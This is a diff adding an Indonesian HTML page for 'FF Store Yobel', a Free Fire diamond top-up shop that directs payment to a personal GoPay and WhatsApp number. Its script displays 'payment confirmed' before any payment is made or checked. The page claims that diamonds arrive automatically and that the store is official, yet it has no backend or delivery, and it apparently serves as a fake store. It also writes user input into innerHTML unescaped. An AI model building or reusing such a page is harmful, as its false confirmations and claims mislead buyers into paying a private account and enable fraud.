@@ -1,0 +1,449 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FF Store Yobel - Top Up Diamond Free Fire</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f0f2f5;
+            margin: 0;
+            padding: 0;
+            color: #333;
+        }
+        
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        header {
+            background-color: #FF5722;
+            color: white;
+            padding: 20px;
+            text-align: center;
+            border-radius: 10px 10px 0 0;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+        }
+        
+        h1 {
+            margin: 0;
+            font-size: 28px;
+        }
+        
+        .logo {
+            font-weight: bold;
+            font-size: 32px;
+            margin-bottom: 10px;
+        }
+        
+        .content {
+            background-color: white;
+            padding: 25px;
+            border-radius: 0 0 10px 10px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+        }
+        
+        input[type="text"], input[type="number"] {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+        
+        .diamond-options {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
+            gap: 15px;
+            margin-bottom: 25px;
+        }
+        
+        .diamond-option {
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            padding: 15px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+        
+        .diamond-option:hover {
+            border-color: #FF5722;
+        }
+        
+        .diamond-option.selected {
+            border-color: #FF5722;
+            background-color: #FFF3E0;
+        }
+        
+        .diamond-amount {
+            font-size: 18px;
+            font-weight: bold;
+            color: #FF5722;
+        }
+        
+        .diamond-price {
+            font-size: 16px;
+            color: #666;
+        }
+        
+        .diamond-tax {
+            font-size: 14px;
+            color: #888;
+        }
+        
+        .payment-method {
+            background-color: #f9f9f9;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+        }
+        
+        .payment-method img {
+            height: 30px;
+            vertical-align: middle;
+            margin-right: 10px;
+        }
+        
+        .payment-details {
+            margin-top: 15px;
+            padding: 15px;
+            background-color: #f0f7ff;
+            border-radius: 8px;
+        }
+        
+        .btn {
+            background-color: #FF5722;
+            color: white;
+            border: none;
+            padding: 12px 20px;
+            font-size: 16px;
+            border-radius: 5px;
+            cursor: pointer;
+            width: 100%;
+            font-weight: bold;
+            transition: background-color 0.3s;
+            margin-bottom: 10px;
+            text-align: center;
+            text-decoration: none;
+            display: block;
+        }
+        
+        .btn:hover {
+            background-color: #E64A19;
+        }
+        
+        .btn-wa {
+            background-color: #25D366;
+        }
+        
+        .btn-wa:hover {
+            background-color: #128C7E;
+        }
+        
+        .confirmation {
+            display: none;
+            margin-top: 20px;
+            padding: 15px;
+            background-color: #E8F5E9;
+            border-radius: 5px;
+            text-align: center;
+        }
+        
+        .checkmark {
+            color: #4CAF50;
+            font-size: 24px;
+            margin-right: 10px;
+        }
+        
+        footer {
+            text-align: center;
+            margin-top: 30px;
+            color: #777;
+            font-size: 14px;
+        }
+        
+        /* New styles for transaction details */
+        .transaction-details {
+            margin-top: 20px;
+            padding: 15px;
+            background-color: #f5f5f5;
+            border-radius: 8px;
+            border-left: 4px solid #FF5722;
+        }
+        
+        .detail-row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 8px;
+        }
+        
+        .detail-label {
+            font-weight: 600;
+            color: #555;
+        }
+        
+        .detail-value {
+            font-weight: bold;
+            color: #333;
+        }
+        
+        .timestamp {
+            font-size: 14px;
+            color: #777;
+            text-align: right;
+            margin-top: 10px;
+        }
+        
+        .payment-instruction {
+            margin-top: 15px;
+            padding: 15px;
+            background-color: #FFF3E0;
+            border-radius: 8px;
+            font-size: 14px;
+        }
+        
+        .gopay-qr {
+            text-align: center;
+            margin: 15px 0;
+        }
+        
+        .gopay-qr img {
+            max-width: 200px;
+            border: 1px solid #ddd;
+            padding: 10px;
+            background: white;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <div class="logo">FF STORE YOBEL</div>
+            <h1>TOP UP DIAMOND FREE FIRE</h1>
+        </header>
+        
+        <div class="content">
+            <form id="topupForm">
+                <div class="form-group">
+                    <label for="playerId">ID Free Fire Anda</label>
+                    <input type="text" id="playerId" placeholder="Masukkan ID Free Fire Anda" required>
+                </div>
+                
+                <div class="form-group">
+                    <label>Pilih Jumlah Diamond</label>
+                    <div class="diamond-options">
+                        <div class="diamond-option" data-amount="50" data-price="12000">
+                            <div class="diamond-amount">50 Diamond</div>
+                            <div class="diamond-price">Rp 12.000</div>
+                            <div class="diamond-tax">(Termasuk pajak Rp 2.000)</div>
+                        </div>
+                        <div class="diamond-option" data-amount="100" data-price="22000">
+                            <div class="diamond-amount">100 Diamond</div>
+                            <div class="diamond-price">Rp 22.000</div>
+                            <div class="diamond-tax">(Termasuk pajak Rp 2.000)</div>
+                        </div>
+                        <div class="diamond-option" data-amount="200" data-price="42000">
+                            <div class="diamond-amount">200 Diamond</div>
+                            <div class="diamond-price">Rp 42.000</div>
+                            <div class="diamond-tax">(Termasuk pajak Rp 2.000)</div>
+                        </div>
+                        <div class="diamond-option" data-amount="500" data-price="102000">
+                            <div class="diamond-amount">500 Diamond</div>
+                            <div class="diamond-price">Rp 102.000</div>
+                            <div class="diamond-tax">(Termasuk pajak Rp 2.000)</div>
+                        </div>
+                        <div class="diamond-option" data-amount="1000" data-price="202000">
+                            <div class="diamond-amount">1000 Diamond</div>
+                            <div class="diamond-price">Rp 202.000</div>
+                            <div class="diamond-tax">(Termasuk pajak Rp 2.000)</div>
+                        </div>
+                        <div class="diamond-option" data-amount="2000" data-price="402000">
+                            <div class="diamond-amount">2000 Diamond</div>
+                            <div class="diamond-price">Rp 402.000</div>
+                            <div class="diamond-tax">(Termasuk pajak Rp 2.000)</div>
+                        </div>
+                    </div>
+                    <input type="hidden" id="selectedDiamond" name="selectedDiamond">
+                    <input type="hidden" id="selectedPrice" name="selectedPrice">
+                </div>
+                
+                <div class="form-group">
+                    <label>Metode Pembayaran</label>
+                    <div class="payment-method">
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/72/Logo_GoPay.svg/1200px-Logo_GoPay.svg.png" alt="GoPay">
+                        <span><strong>GoPay</strong></span>
+                        
+                        <div class="payment-details">
+                            <p>Transfer ke nomor GoPay:</p>
+                            <p style="font-size: 18px; font-weight: bold; color: #FF5722;">+628889013026</p>
+                            <p style="margin-top: 10px;">Silakan masukkan nomor GoPay Anda untuk verifikasi:</p>
+                            <input type="text" id="gopayNumber" placeholder="Contoh: +6281234567890" required style="margin-top: 10px;">
+                        </div>
+                    </div>
+                </div>
+                
+                <button type="button" class="btn" id="confirmBtn">Konfirmasi Pembayaran</button>
+                
+                <a href="https://wa.me/628889013026?text=Saya%20sudah%20transfer%20topup%20FF" class="btn btn-wa">Hubungi via WhatsApp</a>
+                
+                <div class="confirmation" id="confirmation">
+                    <span class="checkmark">✓</span>
+                    <span>Pembayaran Anda telah dikonfirmasi. Diamond akan segera diproses!</span>
+                    
+                    <div class="transaction-details" id="transactionDetails">
+                        <!-- Transaction details will be inserted here -->
+                    </div>
+                    
+                    <div class="payment-instruction" id="paymentInstruction">
+                        <!-- Payment instruction will be inserted here -->
+                    </div>
+                </div>
+            </form>
+        </div>
+        
+        <footer>
+            &copy; <span id="currentYear"></span> FF Store Yobel - Layanan Top Up Diamond Free Fire Resmi dan Terpercaya
+        </footer>
+    </div>
+
+    <script>
+        // Set current year in footer
+        document.getElementById('currentYear').textContent = new Date().getFullYear();
+        
+        // Memilih paket diamond
+        const diamondOptions = document.querySelectorAll('.diamond-option');
+        const selectedDiamondInput = document.getElementById('selectedDiamond');
+        const selectedPriceInput = document.getElementById('selectedPrice');
+        
+        diamondOptions.forEach(option => {
+            option.addEventListener('click', function() {
+                // Hapus selected dari semua opsi
+                diamondOptions.forEach(opt => opt.classList.remove('selected'));
+                
+                // Tambahkan selected ke opsi yang diklik
+                this.classList.add('selected');
+                
+                // Simpan nilai yang dipilih
+                const amount = this.getAttribute('data-amount');
+                const price = this.getAttribute('data-price');
+                
+                selectedDiamondInput.value = amount;
+                selectedPriceInput.value = price;
+            });
+        });
+        
+        // Konfirmasi pembayaran
+        const confirmBtn = document.getElementById('confirmBtn');
+        const confirmation = document.getElementById('confirmation');
+        const transactionDetails = document.getElementById('transactionDetails');
+        const paymentInstruction = document.getElementById('paymentInstruction');
+        
+        confirmBtn.addEventListener('click', function() {
+            const playerId = document.getElementById('playerId').value;
+            const diamondAmount = selectedDiamondInput.value;
+            const price = selectedPriceInput.value;
+            const gopayNumber = document.getElementById('gopayNumber').value;
+            
+            if (!playerId) {
+                alert('Masukkan ID Free Fire Anda terlebih dahulu!');
+                return;
+            }
+            
+            if (!diamondAmount) {
+                alert('Pilih jumlah diamond terlebih dahulu!');
+                return;
+            }
+            
+            if (!gopayNumber) {
+                alert('Masukkan nomor GoPay Anda terlebih dahulu!');
+                return;
+            }
+            
+            // Generate timestamp
+            const now = new Date();
+            const formattedDate = now.toLocaleDateString('id-ID', {
+                weekday: 'long',
+                day: 'numeric',
+                month: 'long',
+                year: 'numeric'
+            });
+            const formattedTime = now.toLocaleTimeString('id-ID', {
+                hour: '2-digit',
+                minute: '2-digit',
+                second: '2-digit'
+            });
+            
+            // Format price with thousand separators
+            const formattedPrice = parseInt(price).toLocaleString('id-ID');
+            
+            // Create transaction details
+            transactionDetails.innerHTML = `
+                <div class="detail-row">
+                    <span class="detail-label">ID Free Fire:</span>
+                    <span class="detail-value">${playerId}</span>
+                </div>
+                <div class="detail-row">
+                    <span class="detail-label">Jumlah Diamond:</span>
+                    <span class="detail-value">${diamondAmount} Diamond</span>
+                </div>
+                <div class="detail-row">
+                    <span class="detail-label">Nominal Pembayaran:</span>
+                    <span class="detail-value">Rp ${formattedPrice}</span>
+                </div>
+                <div class="detail-row">
+                    <span class="detail-label">Nomor GoPay Anda:</span>
+                    <span class="detail-value">${gopayNumber}</span>
+                </div>
+                <div class="timestamp">
+                    Transaksi pada: ${formattedDate}, ${formattedTime}
+                </div>
+            `;
+            
+            // Create payment instruction
+            paymentInstruction.innerHTML = `
+                <h3 style="margin-top: 0; color: #FF5722;">Instruksi Pembayaran:</h3>
+                <p>1. Buka aplikasi GoPay di ponsel Anda</p>
+                <p>2. Masukkan nomor tujuan: <strong>+628889013026</strong></p>
+                <p>3. Masukkan nominal: <strong>Rp ${formattedPrice}</strong></p>
+                <p>4. Tambahkan catatan: <strong>TopUpFF-${playerId}</strong></p>
+                <p>5. Konfirmasi pembayaran</p>
+                
+                <div class="gopay-qr">
+                    <p>Atau scan QR Code berikut:</p>
+                    <img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=gopay://payment?amount=${price}&recipient=628889013026&notes=TopUpFF-${playerId}" alt="QR Code GoPay">
+                </div>
+                
+                <p style="margin-top: 15px; font-weight: bold;">Setelah pembayaran berhasil, diamond akan otomatis masuk ke akun Anda dalam 1-5 menit.</p>
+            `;
+            
+            // Tampilkan pesan konfirmasi
+            confirmation.style.display = 'block';
+            
+            // Scroll ke pesan konfirmasi
+            confirmation.scrollIntoView({ behavior: 'smooth' });
+            
+            // Auto reset form after 10 minutes (optional)
+            setTimeout(() => {
+                document.getElementById('topupForm').reset();
+                diamondOptions.forEach(opt => opt.classList.remove('selected'));
+                // confirmation.style.display = 'none'; // Optional: hide confirmation
+            }, 600000); // 10 minutes
+        });
+    </script>
+</body>
+</html>
